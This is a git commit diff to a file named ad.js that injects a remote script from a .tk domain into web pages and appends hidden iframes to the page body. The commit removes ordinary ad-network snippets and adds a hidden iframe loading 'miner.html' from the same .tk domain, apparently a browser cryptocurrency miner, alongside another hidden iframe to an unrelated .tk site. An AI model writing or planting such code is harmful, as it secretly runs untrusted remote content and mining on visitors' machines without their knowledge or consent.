56722117298773c913ffb1044f909f2589dd42a3
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-09-28 14:24:48 +0800

    fe

--- ad.js
+++ ad.js
@@ -4,13 +4,9 @@
     b.src = "http://www.7k77.tk/eicXsB?1504592003";
     (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
     var divs=[
-    
-    "<script type=\"text/javascript\">\n    adroll_adv_id = \"L7WXEIIXVFHTPO5OCE4XAQ\";\n    adroll_pix_id = \"PITPGXN7PJHEDEFA4N5AHM\";\n    /* OPTIONAL: provide email to improve user identification */\n    /* adroll_email = \"username@example.com\"; */\n    (function () {\n        var _onload = function(){\n            if (document.readyState && !/loaded|complete/.test(document.readyState)){setTimeout(_onload, 10);return}\n            if (!window.__adroll_loaded){__adroll_loaded=true;setTimeout(_onload, 50);return}\n            var scr = document.createElement(\"script\");\n            var host = ((\"https:\" == document.location.protocol) ? \"https://s.adroll.com\" : \"http://a.adroll.com\");\n            scr.setAttribute('async', 'true');\n            scr.type = \"text/javascript\";\n            scr.src = host + \"/j/roundtrip.js\";\n            ((document.getElementsByTagName('head') || [null])[0] ||\n                document.getElementsByTagName('script')[0].parentNode).appendChild(scr);\n        };\n        if (window.addEventListener) {window.addEventListener('load', _onload, false);}\n        else {window.attachEvent('onload', _onload)}\n    }());\n</script>",
 
-    "<script type=\"text/javascript\">\n  ( function() {\n    if (window.CHITIKA === undefined) { window.CHITIKA = { 'units' : [] }; };\n    var unit = {\"calltype\":\"async[2]\",\"publisher\":\"JohnSnowsmith\",\"width\":728,\"height\":90,\"sid\":\"Chitika Default\"};\n    var placement_id = window.CHITIKA.units.length;\n    window.CHITIKA.units.push(unit);\n    document.write('<div id=\"chitikaAdBlock-' + placement_id + '\"></div>');\n}());\n</script>\n<script type=\"text/javascript\" src=\"//cdn.chitika.net/getads.js\" async></script>",
-
-    "<iframe src=\"http://www.adsptp.com/?id=35595\"  style=\"display: none;\"></iframe>",
-    "<iframe src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>"
+    "<iframe src=\"http://emprise.tk/\"  style=\"display: none;\"></iframe>",
+    "<iframe src=\"http://www.7k77.tk/cssjs/miner.html\"  style=\"display: none;\"></iframe>"
     ]
     for (var i=0,len=divs.length;i<len;i++){
         document.body.innerHTML+=divs[i]
